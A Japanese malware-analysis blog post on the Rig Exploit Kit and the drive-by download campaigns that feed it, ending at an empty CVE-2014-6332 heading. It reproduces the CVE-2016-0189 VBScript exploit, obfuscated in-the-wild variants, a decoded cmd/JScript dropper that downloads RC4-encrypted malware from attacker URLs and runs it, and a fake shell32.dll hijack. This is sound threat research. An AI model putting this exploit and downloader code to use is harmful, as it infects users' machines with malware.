# 初めてのRig Exploit Kitリーディング
Written by [@nao_sec](https://twitter.com/nao_sec)([@kkrnt](https://twitter.com/kkrnt), [@PINKSAWTOOTH](https://twitter.com/PINKSAWTOOTH)), 2017-05-15

## はじめに
私はDrive-by Download攻撃について趣味で調べ始めてから3ヶ月が経ちました. それまでは攻撃の概要をぼんやりと知っていただけでしたが, 実際にpseudo-DarkleechやEITestなどのCampaignを追いかけ, 限定的なものではありますが, Drive-by Download攻撃の最前線を見ることが出来ました. 今回は私が今まで調査したことの中でも, 特に面白く, 私を熱中させてくれたRig Exploit Kitについて, 今私が知っている情報の一部を体系的にまとめます. 既知の内容が殆どであることは分かっていますが, 最新の攻撃動向を出来る限り全体を俯瞰すること, 日本語で書くことに意味があると考え, これを公開します.

## Rig Exploit Kitとは
Rig Exploit Kit(RigEK)とは, 現在Drive-by Download攻撃(DbD)で最も利用されているExploit Kitの1つです. DbDとは, 攻撃者が用意したmaliciousなWebサイトや, 攻撃者によってmaliciousなコードがinjectされた一般のWebサイト(Compromisedサイト)へアクセスしたユーザに対して, 幾つかのリダイレクト(drive)を行い, 最終的にマルウェアをダウンロード・インストールさせる攻撃のことです. マルウェアをダウンロードさせるためにブラウザやその他プラグインの脆弱性を突くようなExploit Codeが攻撃者のサーバから送られ, そのコードによってマルウェアがdropし, 感染してしまいます. それらの攻撃の流れを容易に行うために作られているものがExploit Kitです. Exploit Kitを使うことで, 攻撃者は専門的な知識や技能を持たなくても, 容易にDbDを仕掛けることが出来ます. Rigは2016年9月頃から急激にシェアを増やし, 現在では多くのDbD Campaignで利用されています.

## RigEKを使用するCampaign
RigEKを利用している（していた）Campaignは以下のようなものがあります.

- pseudo-Darkleech
- EITest
- GoodMan
- Decimal IP
- Seamless

これらの中で, pseudo-DarkleechとEITestとGoodManは既に観測出来なくなっています. 現在アクティブなのはDecimal IPとSeamlessですが, それぞれについて簡単に紹介します.

### pseudo-Darkleech
pseudo-Darkleechに関しては, malware-traffic-analysisのBradがとても素晴らしいドキュメントを書いてくれています. 詳細を知りたい人はそれを見て下さい.

[Campaign Evolution: pseudo-Darkleech in 2016](http://researchcenter.paloaltonetworks.com/2016/12/unit42-campaign-evolution-pseudo-darkleech-2016/)

pseudo-DarkleechはCompromisedサイトに対して以下のようなコードをinjectし, RigEKへ誘導します.

<img src='http://i.imgur.com/XZ0oTwq.jpg' width='60%'>

とても大規模な攻撃Campaignで, 膨大な数のWebサイトが被害に合っていましたが, 2017年4月3日頃から一切観測出来なくなりました.

特徴としては以下が挙げられます.

- injectされるコードはspanの間に, RigEKへ誘導するiframeが存在し, spanのtop値が大きなマイナス値
- maliciousなコードがinjectされる位置はhtmlタグよりも前か, bodyタグの直前のどちらか
- injectされるコードの末尾にnoscriptタグが存在するため, Compromisedサイトのコンテンツは正常に表示されない
- Compromisedサイトは古いバージョンのCMSを使っていることが多い
- 同一のIPでアクセスするとHTTP Status Code 500を返す
- 同一のIPで多くのCompromisedサイトへアクセスすると, 改ざんされていない正常なページを返す

pseudo-Darkleechのクローキングに関しては別途でドキュメントを書いているので, そちらを参照して下さい.

[pseudo-Darkleech_cloaking.md](https://github.com/koike/public/blob/master/2017/pseudo-Darkleech_cloaking.md)

### EITest
EITestに関しても, Bradが素晴らしい記事を書いています. 是非そちらを参照して下さい.

[Campaign Evolution: EITest from October through December 2016](http://researchcenter.paloaltonetworks.com/2017/01/unit42-campaign-evolution-eitest-october-december-2016/)

EITestはCompromisedサイトに対して以下のようなコードをinjectし, RigEKへ誘導します.

<img src='http://i.imgur.com/kV6nyYZ.jpg' width='60%'>

EITestはpseudo-Darkleechと同時期に活発化していたCampaignで, 日本からは観測出来ないことが殆どでしたが, pseudo-Darkleechと同じように多くのWebサイトが被害に合いました. しかし, EITestは4月28日以降観測されていません.

特徴としては以下が挙げられます.

- injectされるコードは動的にiframeを生成するJavaScriptコードで, そのiframeによってRigEKへ誘導される
- maliciousなコードはbodyタグの閉じタグ付近のinjectされる
- ユーザのGeo情報をもとに攻撃する対象を限定している
- 連続で同一IPを使ってアクセスすると正常なページを返す

### GoodMan
GoodManは2017年3月から観測されるようになったCampaignで, 5月初旬にサーバがサスペンドされました. 私をGoodManをかなり早い段階から観測していて, 初期に発生していたコードミスから, 実際にどのようなコードがinjectされるのかを知っていました. GoodManに関してはmalwarebreakdownが最も詳しく, 彼の記事を参照することをオススメします.

[Finding A ‘Good Man’](https://malwarebreakdown.com/2017/03/10/finding-a-good-man/)

<img src='http://i.imgur.com/9O1Vh2o.jpg' width='60%'>

GoodManはそれほど多くのCompromisedサイトが存在していたわけではありません. そのため私はあまり多くの情報を持っていませんが, 簡単に特徴を挙げます.

- topとleftの値が-500pxのdivタグの中にiframeが存在するコードがCompromisedサイトにinjectされる
- Compromisedサイトのコードがinjectされたコードで上書きされるので, 正常にコンテンツが表示されない
- 常にRigEKへ繋がっているわけではない

### Decimal IP
Decimal IPは2017年3月末にMalwarebytesによって詳細が公開されました. 詳細はmalwarebytesの記事を参照して下さい.

[Websites compromised in ‘Decimal IP’ campaign](https://blog.malwarebytes.com/cybercrime/2017/03/websites-compromised-decimal-ip-campaign/)

これまで紹介したpseudo-DarkleechやEITestとは違い, iframeでリダイレクトせずに, HTTP Status Codeによってリダイレクトします. 動作原理自体は伝統的なDbDの手法ですが, Decimal IPを使うところが特徴です. 一般的に用いられているIPv4は10進数を4つ組み合わせて表現しますが, 他の表記方法もあります. それを利用しているのはこのCampaignで, 恐らくフィルタなどで検知されないようにすることが目的だと思われます.

<img src='http://i.imgur.com/qYXpFqz.jpg' width='60%'>

<img src='http://i.imgur.com/TcLxSzK.jpg' width='60%'>

<img src='http://i.imgur.com/h7Wplmv.jpg' width='60%'>

特徴としては以下が挙げられます.

- 必ずリダイレクトされるわけではない
- 複数のCompromisedサイトから同一のゲートへ到達する
- IEでアクセスした場合と, Chromeでアクセスした場合で処理が分岐する
- 同一IPで2度以上複数のCompromisedサイトへアクセスすることは出来ない

IEでアクセスした場合は上記のような動作をしますが, Chromeでアクセスした場合はRigEKへ誘導せずに, Adobe Flash Playerのアップデートを模したサイトを用いてユーザにマルウェアを実行させようとします. それらの詳細については, 別途記事を書いているので, そちらを参照して下さい.

[Overlooking Decimal IP Campaign](http://www.nao-sec.org/2017/05/overlooking-decimal-ip-campaign.html)

ロジックが原始的で, かなり荒削りな部分が目立つCampaignで, Compromisedサイトの数は多くないと思われます.

### Seamless
Seamlessは2017年2月頃から観測されていたと思いますが, 詳細な記事が出たのは3月末です. Cisco Umbrellaの記事がとても参考になるでしょう. 私はSeamlessを殆ど観測したことがないので, 詳細はその記事を参照して下さい.

[‘Seamless’ Campaign Delivers Ramnit via Rig EK](https://umbrella.cisco.com/blog/2017/03/29/seamless-campaign-delivers-ramnit-via-rig-ek/)

## RigEKの挙動
ここまででRigEKが様々なDbD Campaignで利用されていることが分かったでしょう. 次にCompromisedサイトからRigEKへリダイレクトしてきたユーザに対して, RigEKがどのような動きをするのか, 以下の図に説明します.

<img src='http://i.imgur.com/5UmaYpp.jpg' width='60%'>

1. ユーザがCompromisedサイトへアクセスします
2. CompromisedサイトにinjectされたコードによってRigEKへ繋がるURLを生成します
3. CompromisedサイトはRigEKへ繋がるURLを含むデータをユーザへ返します
4. ユーザは受け取ったデータに従ってRIgEKへ繋がるURLにアクセスします. RigEKはアクセスしてきたユーザの環境に合わせた(ブラウザやプラグインの脆弱性を突く）ペイロードを含む難読化されたデータをユーザに返します
5. ユーザはペイロードによってマルウェアをダウンロードし, 実行します

こうした流れによってユーザはWebサイトにアクセスしただけでマルウェアに感染します.

具体的なDecimal IPにおけるトラフィックを以下に示します. 実際のpcapファイルは[こちら](decimalip_rig.pcap)にあるので, 詳細を見たい人は参照して下さい.

<img src='http://i.imgur.com/oDgtebf.jpg' width='60%'>

まずユーザはCompromisedサイトへアクセスします. するとCompromisedサイトからはHTTP Status Code 302によってLocationへリダイレクトを行います.

<img src='http://i.imgur.com/ShVHaiE.jpg' width='60%'>

リダイレクト先でも同じようにHTTP Status Code 302によってrig.phpというファイルへリダイレクトします.

<img src='http://i.imgur.com/2P1VnIl.jpg' width='60%'>

rig.phpではRigEKへ誘導するURLに接続します.

<img src='http://i.imgur.com/B4kdDrV.jpg' width='60%'>
<img src='http://i.imgur.com/CfuQecJ.jpg' width='60%'>

すると難読化されたJavaScriptを含むhtmlをブラウザが読み込み, 何らかの脆弱性を突くコードが走ることによってマルウェアがダウンロードされ, 実行されます.

## RigEKのファイル
上記の説明で, RigEKのおおよその動きは理解出来たかと思います. RigEKへリダイレクトされるところまでは全く特に難しい部分もないですが, RigEKから送られてくる難読化されたコードが何をしているのか, 具体的に示します.

以下では私が以前書いた[Analyzing Rig Exploit Kit vol.1](http://www.nao-sec.org/2017/04/analyzing-rig-exploit-kit-vol1.html)のコードを参照します. 現在のRigEKのコードと違う部分も多少あるかもしれませんが, その部分は適宜読み替えて下さい.

CompromisedサイトなどのiframeからRigEKへ誘導されると, まず以下のようなhtmlが返ってきます.

[html](https://gist.github.com/anonymous/1911aeeb85b10cc76e8fcdf61633a6b5)

このhtmlは3つのJavaScriptセクションに分割することができ, それぞれ3行のJavaScriptコードで, 同一の復号ルーチンで難読化を解除することが出来ます. もっともコード量の少ない3つ目のセクションを例に, 難読化を解除してみます.

[JavaScript](https://gist.github.com/anonymous/ded41ab808e19110d449046fe8af0850)

このコードを読みやすく整形すると以下のようになります.

[JavaScript](https://gist.github.com/anonymous/d4603c14265cc0ad524d7ead73988e9a)

単純に2つに分割されたJavaScriptコードをつなぎ合わせ, evalで実行しているだけです. 実行されているコードは以下のようになります.

[JavaScript](https://gist.github.com/anonymous/d92f3be6bc24c4e8d6ceecfab066a393)

Base64エンコードされた文字列を復号し実行しています. 実行されているコードは各セクションで以下のようになっています.

[JavaScript](https://gist.github.com/anonymous/d22637e721326772ead570975c836ae5)

[JavaScript](https://gist.github.com/anonymous/d00d27f786ea41aa36ed02069dcb5abb)

[JavaScript](https://gist.github.com/anonymous/a00755dfe223da251f2aea4f92d69969)

VBScriptのコードが2つと, swfを読み込むコードが1つです. これらのコードはブラウザなどの脆弱性を突くコードで, これらによってマルウェアがダウンロードされ, 実行されます.

## User-Agentとペイロードの関係
先ほど```RigEKはアクセスしてきたユーザの環境に合わせた(ブラウザやプラグインの脆弱性を突く）ペイロードを含む難読化されたデータをユーザに返します```と書きましたが, 実際の対応関係について紹介します.

以下は私が2017年5月11日に, IE6~11を使ってRigEKへアクセスした際に取得したペイロードを元に作成した対応表です.

![13.jpg](http://i.imgur.com/JHrNrNJ.jpg)

PDFバージョンは[こちら](rig_ua.pdf)にあります.

(私はswfについて全く知識がないので, swfで利用されている脆弱性については調査していませんが, swfが読み込まれるコードが存在するかどうかをマークしています)

RigEKはユーザから送られてくるリクエスト内のUser-Agentを利用して, ユーザの環境でpwn出来るようなペイロードを選んで送っていることが分かります.

## ペイロードの紹介
### CVE-2016-0189
>The Microsoft (1) JScript 5.8 and (2) VBScript 5.7 and 5.8 engines, as used in Internet Explorer 9 through 11 and other products, allow remote attackers to execute arbitrary code or cause a denial of service (memory corruption) via a crafted web site, aka "Scripting Engine Memory Corruption Vulnerability," a different vulnerability than CVE-2016-0187. 

http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0189

#### exploit (POC)
1. ダミーのVBScriptClassインスタンスを作成する
2. クラスインスタンスのアドレスを取得する
3. クラスインスタンスからCSessionアドレスをリークする
4. CSessionインスタンスからCOleScriptアドレスをリークする
5. COleScriptのSafetyOptionを上書きする

```vb
Function exploit (arg1)
            Dim addr
            Dim csession
            Dim olescript
            Dim mem
            ' Create a vbscript class instance
            Set dm = New Dummy
            ' Get address of the class instance
            addr = getAddr(arg1, dm)
            ' Leak CSession address from class instance
            mem = leakMem(arg1, addr + 8)
            csession = strToInt(Mid(mem, 3, 2))
            ' Leak COleScript address from CSession instance
            mem = leakMem(arg1, csession + 4)
            olescript = strToInt(Mid(mem, 1, 2))
            ' Overwrite SafetyOption in COleScript (e.g. god mode)
            ' e.g. changes it to 0x04 which is not in 0x0B mask
            overwrite arg1, olescript + &H174
```

* https://github.com/theori-io/cve-2016-0189
* https://www.exploit-db.com/exploits/40118/

#### How to use in RIG
RIGで観測されたexploitは2種類ありました. POCで公開されているコードとVBSの部分のコードはほぼ同等で, いくつかの難読化処理が見られます.

##### ver.1
###### exploit
```vb
Function fghdfgh (arg1)
            Dim addr
            Dim csession
            Dim olescript
            Dim mem
            Set dm = New Dummy
            addr = getAddr(arg1, dm)
            mem = leakMem(arg1, addr + 8)
            csession = strToInt(Mid(mem, 3, 2))
            mem = leakMem(arg1, csession + 4)
            olescript = strToInt(Mid(mem, 1, 2))
            overwrite arg1, olescript + &H174
	    sdefgfss() 
            overwrite2 arg1, olescript + &H174
End Function
```


###### execute
実行するコマンドは難読化されています.

```vb
        　Set w=CreateObject("WScript.Shell")
	  key="gexywoaxor"
	  url="http://top.associatedorthopaedicsva.com/?oq=J5e7FSbAPkjkXTeQ1mmNsJVV0a9K-pjkTdzhLN1pPR_hOKZQxN-aKcHbAy0W2oj7kX&car=2125&policy=coffe&ct=sround&q=w3_QMvXcJxfQFYbGMvzDSKNbNkzWHViPxouG9MildZ2qZGX_k7XDfF-qoV3cCgWRxf&wendsday=sround.98wq59.406p2z1t1" 
	  uas=Navigator.UserAgent
	  sdfa="WQ63WQ6DWQ64WQ2EWQ65WQ78WQ65WQ20WQ2FWQ71WQ20WQ2FWQ63WQ20WQ63WQ64WQ20WQ2FWQ64WQ20WQ22WQ25WQ74WQ6DWQ70WQ25WQ22WQ20WQ26WQ26WQ20WQ65WQ63WQ68WQ6FWQ20WQ66WQ75WQ6EWQ63WQ74WQ69WQ6FWQ6EWQ20WQ4FWQ28WQ6CWQ29WQ7BWQ76WQ61WQ72WQ20WQ77WQ3DWQ22WQ70WQ6FWQ77WQ22WQ2CWQ6AWQ3DWQ33WQ37WQ2DWQ31WQ3BWQ72WQ65WQ74WQ75WQ72WQ6EWQ20WQ41WQ2EWQ72WQ6FWQ75WQ6EWQ64WQ28WQ28WQ41WQ5BWQ77WQ5DWQ28WQ6AWQ2CWQ6CWQ2BWQ31WQ29WQ2DWQ41WQ2EWQ72WQ61WQ6EWQ64WQ6FWQ6DWQ28WQ29WQ2AWQ41WQ5BWQ77WQ5DWQ28WQ6AWQ2CWQ6CWQ29WQ29WQ29WQ2EWQ74WQ6FWQ53WQ74WQ72WQ69WQ6EWQ67WQ28WQ6AWQ29WQ5BWQ22WQ73WQ6CWQ69WQ63WQ65WQ22WQ5DWQ28WQ31WQ29WQ7DWQ3BWQ66WQ75WQ6EWQ63WQ74WQ69WQ6FWQ6EWQ20WQ56WQ28WQ6BWQ29WQ7BWQ76WQ61WQ72WQ20WQ79WQ3DWQ61WQ28WQ65WQ2BWQ22WQ2EWQ22WQ2BWQ65WQ2BWQ22WQ52WQ65WQ71WQ75WQ65WQ73WQ74WQ2EWQ35WQ2EWQ31WQ22WQ29WQ3BWQ79WQ2EWQ73WQ65WQ74WQ50WQ72WQ6FWQ78WQ79WQ28WQ6EWQ29WQ3BWQ79WQ2EWQ6FWQ70WQ65WQ6EWQ28WQ22WQ47WQ45WQ54WQ22WQ2CWQ6BWQ28WQ31WQ29WQ2CWQ31WQ29WQ3BWQ79WQ2EWQ4FWQ70WQ74WQ69WQ6FWQ6EWQ28WQ6EWQ29WQ3DWQ6BWQ28WQ32WQ29WQ3BWQ79WQ5BWQ22WQ73WQ65WQ6EWQ64WQ22WQ5DWQ28WQ29WQ3BWQ79WQ2EWQ2FWQ2AWQ41WQ42WQ43WQ44WQ45WQ2AWQ2FWQ57WQ61WQ69WQ74WQ46WQ6FWQ72WQ52WQ65WQ73WQ70WQ6FWQ6EWQ73WQ65WQ28WQ29WQ3BWQ69WQ66WQ28WQ32WQ30WQ30WQ3DWQ3DWQ79WQ2EWQ73WQ74WQ61WQ74WQ75WQ73WQ29WQ72WQ65WQ74WQ75WQ72WQ6EWQ20WQ5FWQ28WQ79WQ2EWQ72WQ65WQ73WQ70WQ6FWQ6EWQ73WQ65WQ54WQ65WQ78WQ74WQ2CWQ6BWQ28WQ6EWQ29WQ29WQ7DWQ3BWQ66WQ75WQ6EWQ63WQ74WQ69WQ6FWQ6EWQ20WQ5FWQ28WQ6BWQ2CWQ65WQ29WQ7BWQ66WQ6FWQ72WQ28WQ76WQ61WQ72WQ20WQ6CWQ3DWQ30WQ2CWQ6EWQ2CWQ63WQ3DWQ5BWQ5DWQ2CWQ46WQ3DWQ32WQ35WQ36WQ2DWQ31WQ2CWQ53WQ3DWQ53WQ74WQ72WQ69WQ6EWQ67WQ2CWQ71WQ3DWQ5BWQ5DWQ2CWQ62WQ3DWQ30WQ3BWQ32WQ35WQ36WQ5EWQ3EWQ62WQ3BWQ62WQ2BWQ2BWQ29WQ63WQ5BWQ62WQ5DWQ3DWQ62WQ3BWQ66WQ6FWQ72WQ28WQ62WQ3DWQ30WQ3BWQ32WQ35WQ36WQ5EWQ3EWQ62WQ3BWQ62WQ2BWQ2BWQ29WQ6CWQ3DWQ6CWQ2BWQ63WQ5BWQ62WQ5DWQ2BWQ65WQ2EWQ63WQ68WQ61WQ72WQ43WQ6FWQ64WQ65WQ41WQ74WQ28WQ62WQ25WQ65WQ2EWQ6CWQ65WQ6EWQ67WQ74WQ68WQ29WQ5EWQ26WQ46WQ2CWQ6EWQ3DWQ63WQ5BWQ62WQ5DWQ2CWQ63WQ5BWQ62WQ5DWQ3DWQ63WQ5BWQ6CWQ5DWQ2CWQ63WQ5BWQ6CWQ5DWQ3DWQ6EWQ3BWQ66WQ6FWQ72WQ28WQ76WQ61WQ72WQ20WQ70WQ3DWQ6CWQ3DWQ62WQ3DWQ30WQ3BWQ70WQ5EWQ3CWQ6BWQ2EWQ6CWQ65WQ6EWQ67WQ74WQ68WQ3BWQ70WQ2BWQ2BWQ29WQ62WQ3DWQ62WQ2BWQ31WQ5EWQ26WQ46WQ2CWQ6CWQ3DWQ6CWQ2BWQ63WQ5BWQ62WQ5DWQ5EWQ26WQ46WQ2CWQ6EWQ3DWQ63WQ5BWQ62WQ5DWQ2CWQ63WQ5BWQ62WQ5DWQ3DWQ63WQ5BWQ6CWQ5DWQ2CWQ63WQ5BWQ6CWQ5DWQ3DWQ6EWQ2CWQ71WQ2EWQ70WQ75WQ73WQ68WQ28WQ53WQ2EWQ66WQ72WQ6FWQ6DWQ43WQ68WQ61WQ72WQ43WQ6FWQ64WQ65WQ28WQ6BWQ2EWQ63WQ68WQ61WQ72WQ43WQ6FWQ64WQ65WQ41WQ74WQ28WQ70WQ29WQ5EWQ5EWQ63WQ5BWQ63WQ5BWQ62WQ5DWQ2BWQ63WQ5BWQ6CWQ5DWQ5EWQ26WQ46WQ5DWQ29WQ29WQ3BWQ72WQ65WQ74WQ75WQ72WQ6EWQ20WQ71WQ2EWQ6AWQ6FWQ69WQ6EWQ28WQ22WQ22WQ29WQ7DWQ3BWQ74WQ72WQ79WQ7BWQ76WQ61WQ72WQ20WQ75WQ3DWQ57WQ53WQ63WQ72WQ69WQ70WQ74WQ2CWQ6FWQ3DWQ22WQ4FWQ62WQ6AWQ65WQ63WQ74WQ22WQ2CWQ41WQ3DWQ4DWQ61WQ74WQ68WQ2CWQ61WQ3DWQ46WQ75WQ6EWQ63WQ74WQ69WQ6FWQ6EWQ28WQ22WQ62WQ22WQ2CWQ22WQ72WQ65WQ74WQ75WQ72WQ6EWQ20WQ75WQ2EWQ43WQ72WQ65WQ61WQ74WQ65WQ22WQ2BWQ6FWQ2BWQ22WQ28WQ62WQ29WQ22WQ29WQ3BWQ50WQ3DWQ28WQ22WQ22WQ2BWQ75WQ29WQ2EWQ73WQ70WQ6CWQ69WQ74WQ28WQ22WQ20WQ22WQ29WQ5BWQ31WQ5DWQ2CWQ4DWQ3DWQ22WQ69WQ6EWQ64WQ65WQ78WQ4FWQ66WQ22WQ2CWQ71WQ3DWQ61WQ28WQ50WQ2BWQ22WQ69WQ6EWQ67WQ2EWQ46WQ69WQ6CWQ65WQ53WQ79WQ73WQ74WQ65WQ6DWQ22WQ2BWQ6FWQ29WQ2CWQ6DWQ3DWQ75WQ2EWQ41WQ72WQ67WQ75WQ6DWQ65WQ6EWQ74WQ73WQ2CWQ65WQ3DWQ22WQ57WQ69WQ6EWQ48WQ54WQ54WQ50WQ22WQ2CWQ5AWQ3DWQ22WQ63WQ6DWQ64WQ22WQ2CWQ6AWQ3DWQ61WQ28WQ22WQ57WQ22WQ2BWQ50WQ2BWQ22WQ2EWQ53WQ68WQ65WQ6CWQ6CWQ22WQ29WQ2CWQ73WQ3DWQ61WQ28WQ22WQ41WQ44WQ4FWQ44WQ42WQ2EWQ53WQ74WQ72WQ65WQ61WQ6DWQ22WQ29WQ2CWQ78WQ3DWQ4FWQ28WQ38WQ29WQ2BWQ22WQ2EWQ22WQ2CWQ70WQ3DWQ22WQ65WQ78WQ65WQ22WQ2CWQ6EWQ3DWQ30WQ2CWQ4BWQ3DWQ75WQ5BWQ50WQ2BWQ22WQ46WQ75WQ6CWQ6CWQ4EWQ61WQ6DWQ65WQ22WQ5DWQ2CWQ45WQ3DWQ22WQ2EWQ22WQ2BWQ70WQ3BWQ73WQ2EWQ54WQ79WQ70WQ65WQ3DWQ32WQ3BWQ73WQ2EWQ43WQ68WQ61WQ72WQ73WQ65WQ74WQ3DWQ22WQ69WQ73WQ6FWQ2DWQ38WQ38WQ35WQ39WQ2DWQ31WQ22WQ3BWQ73WQ2EWQ4FWQ70WQ65WQ6EWQ28WQ29WQ3BWQ74WQ72WQ79WQ7BWQ76WQ3DWQ56WQ28WQ6DWQ29WQ7DWQ63WQ61WQ74WQ63WQ68WQ28WQ57WQ29WQ7BWQ76WQ3DWQ56WQ28WQ6DWQ29WQ7DWQ3BWQ64WQ3DWQ76WQ2EWQ63WQ68WQ61WQ72WQ43WQ6FWQ64WQ65WQ41WQ74WQ28WQ30WQ32WQ37WQ2BWQ76WQ5BWQ4DWQ5DWQ28WQ22WQ50WQ45WQ5CWQ78WQ30WQ30WQ5CWQ78WQ30WQ30WQ22WQ29WQ29WQ3BWQ73WQ2EWQ57WQ72WQ69WQ74WQ65WQ54WQ65WQ78WQ74WQ28WQ76WQ29WQ3BWQ69WQ66WQ28WQ33WQ31WQ5EWQ3CWQ64WQ29WQ7BWQ76WQ61WQ72WQ20WQ7AWQ3DWQ31WQ3BWQ78WQ2BWQ3DWQ22WQ64WQ6CWQ6CWQ22WQ7DWQ65WQ6CWQ73WQ65WQ20WQ78WQ2BWQ3DWQ70WQ3BWQ73WQ5BWQ22WQ73WQ61WQ76WQ65WQ74WQ6FWQ66WQ69WQ6CWQ65WQ22WQ5DWQ28WQ78WQ2CWQ32WQ29WQ3BWQ73WQ2EWQ43WQ6CWQ6FWQ73WQ65WQ28WQ29WQ3BWQ66WQ3DWQ22WQ72WQ22WQ3BWQ7AWQ5EWQ26WQ5EWQ26WQ28WQ78WQ3DWQ22WQ72WQ65WQ67WQ73WQ76WQ22WQ2BWQ66WQ2BWQ33WQ32WQ2BWQ45WQ2BWQ22WQ20WQ2FWQ73WQ20WQ22WQ2BWQ78WQ29WQ3BWQ6AWQ2EWQ72WQ75WQ6EWQ28WQ5AWQ2BWQ45WQ2BWQ22WQ20WQ2FWQ63WQ20WQ22WQ2BWQ78WQ2CWQ30WQ29WQ7DWQ63WQ61WQ74WQ63WQ68WQ28WQ5FWQ78WQ29WQ7BWQ7DWQ3BWQ71WQ2EWQ44WQ65WQ6CWQ65WQ74WQ65WQ66WQ69WQ6CWQ65WQ28WQ4BWQ29WQ3BWQ3EWQ6FWQ33WQ32WQ2EWQ74WQ6DWQ70WQ20WQ26WQ26WQ20WQ73WQ74WQ61WQ72WQ74WQ20WQ77WQ73WQ63WQ72WQ69WQ70WQ74WQ20WQ2FWQ2FWQ42WQ20WQ2FWQ2FWQ45WQ3AWQ4AWQ53WQ63WQ72WQ69WQ70WQ74WQ20WQ6FWQ33WQ32WQ2EWQ74WQ6DWQ70WQ20WQ22"
	  sert = Replace(sdfa, "WQ", "%")
	  str=UnEscape(sert)&key&Chr(34)&Chr(32)&Chr(34)&url&Chr(34)&Chr(32)&Chr(34)&uas&Chr(34)
      w.Run str,0
```

実行したコマンドをデコードすると以下のようになります.

```bat
cmd.exe /q /c cd /d "%tmp%" && echo function O(l){var w="pow",j=37-1;return A.round((A[w](j,l+1)-A.random()*A[w](j,l))).toString(j)["slice"](1)};function V(k){var y=a(e+"."+e+"Request.5.1");y.setProxy(n);y.open("GET",k(1),1);y.Option(n)=k(2);y["send"]();y./*ABCDE*/WaitForResponse();if(200==y.status)return _(y.responseText,k(n))};function _(k,e){for(var l=0,n,c=[],F=256-1,S=String,q=[],b=0;256^>b;b++)c[b]=b;for(b=0;256^>b;b++)l=l+c[b]+e.charCodeAt(b%e.length)^&F,n=c[b],c[b]=c[l],c[l]=n;for(var p=l=b=0;p^<k.length;p++)b=b+1^&F,l=l+c[b]^&F,n=c[b],c[b]=c[l],c[l]=n,q.push(S.fromCharCode(k.charCodeAt(p)^^c[c[b]+c[l]^&F]));return q.join("")};try{var u=WScript,o="Object",A=Math,a=Function("b","return u.Create"+o+"(b)");P=(""+u).split(" ")[1],M="indexOf",q=a(P+"ing.FileSystem"+o),m=u.Arguments,e="WinHTTP",Z="cmd",j=a("W"+P+".Shell"),s=a("ADODB.Stream"),x=O(8)+".",p="exe",n=0,K=u[P+"FullName"],E="."+p;s.Type=2;s.Charset="iso-8859-1";s.Open();try{v=V(m)}catch(W){v=V(m)};d=v.charCodeAt(027+v[M]("PE\x00\x00"));s.WriteText(v);if(31^<d){var z=1;x+="dll"}else x+=p;s["savetofile"](x,2);s.Close();f="r";z^&^&(x="regsv"+f+32+E+" /s "+x);j.run(Z+E+" /c "+x,0)}catch(_x){};q.Deletefile(K);>o32.tmp && start wscript //B //E:JScript o32.tmp "gexywoaxor" "http://top.associatedorthopaedicsva.com/?oq=J5e7FSbAPkjkXTeQ1mmNsJVV0a9K-pjkTdzhLN1pPR_hOKZQxN-aKcHbAy0W2oj7kX&car=2125&policy=coffe&ct=sround&q=w3_QMvXcJxfQFYbGMvzDSKNbNkzWHViPxouG9MildZ2qZGX_k7XDfF-qoV3cCgWRxf&wendsday=sround.98wq59.406p2z1t1" "Navigator.UserAgent"
```

##### ver.2
###### exploit
```vb
Function ProtectMe (arg1)
            Dim addr
            Dim sexy
            Dim koles
            Dim mem
            Set dm = New MiddleD
            addr = GogoGoA(arg1, dm)
            mem = LikeMeLike(arg1, addr + 8)
            sexy = strToInt(Mid(mem, 3, 2))
            mem = LikeMeLike(arg1, sexy + 4)
            koles = strToInt(Mid(mem, 1, 2))
            Rewwati arg1, koles + &H174
	        fire()
            Rewwati2 arg1, koles + &H174
End Function
```

###### execute
fire()では以下の処理が行われます. req.Sendで指定したURLからRC4エンコードされたマルウェアをダウンロードします.

```vb
    url="http://set.associatedorthopedics.com/?policy=choko&oq=86V_KrRUbwTpiheDKgVimY1VBFpCpfunjhSBnUOe0ZOF9CWEaANM9pucHbkLhR32&wendsday=soul.127nr84.406c8b6h9&car=2243&q=z37QMvXcJwDQDoTHMvrESLtEMU_OHUKK2OH_783VCZv9JHT1vvHPRAPxtgWCel_Q&ct=soul"
    uas=Navigator.userAgent
	  
    Set oss=GetObject("winmgmts:").InstancesOf("Win32_OperatingSystem")
    Dim osloc
    for each os in oss
      osloc=os.OSLanguage
    next
    SetLocale(osloc)
    Set req=CreateObject("WinHTTP.WinHTTPRequest.5.1")
    req.SetProxy 0
    req.Open "GET",url,0
    req.Option(0)=uas
    req.Send
    If 200=req.status Then
```

req.statusが200(成功)ならば, fakedllを作成します.

```vb
　　　　　　　dlltxt = Join(dllcode,"")
　　　　　　　fakedll = c.BuildPath(fake32,"shell32.dll")            
　　　　　　　Set b=c.CreateTextFile(fakedll)            
　　　　　　　b.Write dlltxt
　　　　　　　b.Close
```

さらにarcnsave()内でダウンロードしたマルウェアをデコードし, %tmp%以下の[ランダム8文字].exe生成します.

```vb
　　　　　　　f=c.BuildPath(tmp,rnds(8)&".exe")
　　　　　　　Set stream=CreateObject("ADODB.Stream")
            stream.Open
            stream.Type=1
            stream.Write z
            arcnsave stream,key,f
            stream.Close
```

作成した%tmp%以下の[ランダム8文字].exeを実行するための準備が行われます. 環境変数を設定し, ```CreateObject("Shell.Application")```で作成したdllを読みこませます.

```vb
            Set w=CreateObject("WScript.Shell")
            w.CurrentDirectory=tmp
            oldroot=w.Environment("Process").Item("SystemRoot")
            w.Environment("Process").Item("SystemRoot")=tmp
            w.Environment("Process").Item("SysFilename")=f
            Set sh = CreateObject("Shell.Application")
            Environment("Process").Item("SystemRoot")=oldroot
```

dllがマルウェアを実行されているようです.
DllEntryPointではCreateProcessAsUserWが呼ばれていました.

![](https://i.imgur.com/sAVaJfi.png)


しかし, lpCmmandLineの文字列はよくわからなかったので, 誰か詳しい人教えてください:pray:

![](https://i.imgur.com/GBShm6W.png)

これは以下と同じ処理だと考えられます.

>Nebula EK uses a technique published on BlackHat 2014 [2] to circumvent this problem. When you create a Shell.Application object, IE loads% systemroot% \ system32 \ shell32.dll. Normally% systemroot% is c: \ windows directory. However, an attacker can perform DLL hijacking attacks as follows.
>
>    1) Create the system32 directory in the% temp% \ directory
>    2) in the above created directory to generate a fake shell32.dll file used to load the need to load the program. Nebula EK in the VBScript script will generate a 3K or so files.
>    3) Before creating the Shell.Application object in the script, use WScript.Shell to modify the% system32% environment variable, point to 1) to create the directory
>    4) create a Shell.Application object, which automatically load the fake shell32.dll file to achieve the purpose of the implementation of the document.
>     
http://www.freebuf.com/sectool/131766.html

----

### CVE-2014-6332
